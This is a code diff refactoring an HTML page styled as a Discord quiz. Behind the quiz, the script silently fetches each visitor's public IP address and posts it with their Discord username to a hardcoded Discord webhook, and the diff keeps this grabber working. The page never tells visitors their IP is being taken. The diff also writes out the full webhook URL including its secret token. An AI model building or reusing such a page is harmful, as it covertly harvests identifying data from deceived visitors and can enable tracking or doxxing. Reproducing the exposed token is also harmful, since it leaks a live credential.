@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Blobster - Main</title>
-    <!-- Change the href attribute value to the URL of your icon image -->
     <link rel="icon" type="image/png" href="https://www.artstation.com/artwork/Dv03yo">
     <style>
         body {
@@ -29,7 +28,7 @@
             transform: translate(-50%, -50%);
             transition: opacity 0.5s ease;
             opacity: 1;
-            outline: 1px solid white; /* Add white outline */
+            outline: 1px solid white;
         }
         input[type="text"] {
             padding: 10px;
@@ -76,10 +75,9 @@
     </style>
 </head>
 <body>
-    <!-- Your HTML content -->
     <div class="container" id="firstScreen">
         <h1>Welcome to the Quiz!</h1>
-        <p>Please enter your Discord username to proceed: (Please be truthful). </p>
+        <p>Please enter your Discord username to proceed: (Please be truthful).</p>
         <label for="discordUsername">Enter your Discord username:</label>
         <input type="text" id="discordUsername" placeholder="Discord user - Do not use a display">
         <br>
@@ -89,73 +87,57 @@
     <div class="container" id="secondScreen">
         <h1>Event Completed</h1>
         <p>Made by BlobsterWasHere on discord.</p>
-        <p>To learn more DM me. </p>
+        <p>To learn more DM me.</p>
     </div>
 
     <script>
-        const discordUsernameInput = document.getElementById('discordUsername');
-        const clickMeBtn = document.getElementById('clickMeBtn');
-        const firstScreen = document.getElementById('firstScreen');
-        const secondScreen = document.getElementById('secondScreen');
+        document.addEventListener('DOMContentLoaded', () => {
+            const discordUsernameInput = document.getElementById('discordUsername');
+            const clickMeBtn = document.getElementById('clickMeBtn');
+            const firstScreen = document.getElementById('firstScreen');
+            const secondScreen = document.getElementById('secondScreen');
 
-        discordUsernameInput.addEventListener('input', function() {
-            clickMeBtn.disabled = !discordUsernameInput.value.trim();
-        });
+            discordUsernameInput.addEventListener('input', () => {
+                clickMeBtn.disabled = !discordUsernameInput.value.trim();
+            });
 
-        clickMeBtn.addEventListener('click', function() {
-            const discordUsername = discordUsernameInput.value.trim();
-            if (!discordUsername) {
-                // Add shake animation to the button
-                clickMeBtn.classList.add('shake');
-                // Remove shake animation after 0.5s
-                setTimeout(() => {
-                    clickMeBtn.classList.remove('shake');
-                }, 500);
-                return;
-            }
+            clickMeBtn.addEventListener('click', () => {
+                const discordUsername = discordUsernameInput.value.trim();
+                if (!discordUsername) {
+                    clickMeBtn.classList.add('shake');
+                    setTimeout(() => clickMeBtn.classList.remove('shake'), 500);
+                    return;
+                }
 
-            // Get the IP address using ipify
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    // Send the IP address and Discord username to the Discord webhook
-                    const webhookUrl = 'https://discord.com/api/webhooks/1244268067526017024/sO0_lmSwZRJhkzxjelwk4p_EWzCCtfTd8aU1vucD8yxcUSmlcejy_qFZcnbOCeKlYitL';
-                    const message = {
-                        content: `!IP: ${ip}, Username: ${discordUsername}`
-                    };
-                    
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(message)
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const ip = data.ip;
+                        const webhookUrl = 'https://discord.com/api/webhooks/1244268067526017024/sO0_lmSwZRJhkzxjelwk4p_EWzCCtfTd8aU1vucD8yxcUSmlcejy_qFZcnbOCeKlYitL';
+                        const message = {
+                            content: `!IP: ${ip}, Username: ${discordUsername}`
+                        };
+
+                        return fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(message)
+                        });
                     })
                     .then(response => {
-                        // Check if the request was successful
                         if (!response.ok) {
                             throw new Error('Failed to send webhook request');
                         }
-                        // Hide the first screen
                         firstScreen.style.opacity = 0;
-                        // Show the second screen
                         secondScreen.style.display = 'block';
-
-                        // Smoothly center the second screen
                         secondScreen.style.top = '50%';
                         secondScreen.style.left = '50%';
                         secondScreen.style.transform = 'translate(-50%, -50%)';
                     })
-                    .catch(error => {
-                        console.error('ERROR', error);
-                        // Handle error here
-                    });
-                })
-                .catch(error => {
-                    console.error('ERROR', error);
-                    // Handle error here
-                });
+                    .catch(error => console.error('ERROR', error));
+            });
         });
     </script>
 </body>
